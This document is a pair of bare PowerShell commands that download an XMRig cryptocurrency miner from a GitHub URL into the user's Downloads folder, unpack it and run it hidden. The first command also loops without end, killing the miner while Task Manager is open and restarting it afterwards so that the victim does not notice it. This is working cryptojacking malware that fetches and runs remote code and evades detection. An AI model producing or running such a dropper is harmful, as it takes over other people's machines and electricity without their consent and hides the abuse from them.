powershell.exe -WindowStyle Hidden -NoProfile -Command $d="$env:USERPROFILE\Downloads"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; Expand-Archive "$d\xmrig.zip" "$d\xmrig" -Force; $exe=Get-ChildItem "$d\xmrig" -Recurse -Filter xmrig.exe | Select -First 1; Start-Process $exe.FullName -WindowStyle Hidden ; $exe="xmrig.exe"; while ($true) { if (Get-Process Taskmgr -ErrorAction SilentlyContinue) { Get-Process $exe -ErrorAction SilentlyContinue | Stop-Process -Force }; if (-not (Get-Process $exe -ErrorAction SilentlyContinue)) { Start-Process $exe }; Start-Sleep 1 }
$d="$env:USERPROFILE\Downloads"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; Expand-Archive "$d\xmrig.zip" "$d\xmrig" -Force; $exe=Get-ChildItem "$d\xmrig" -Recurse -Filter xmrig.exe | Select -First 1; Start-Process $exe.FullName -WindowStyle Hidden
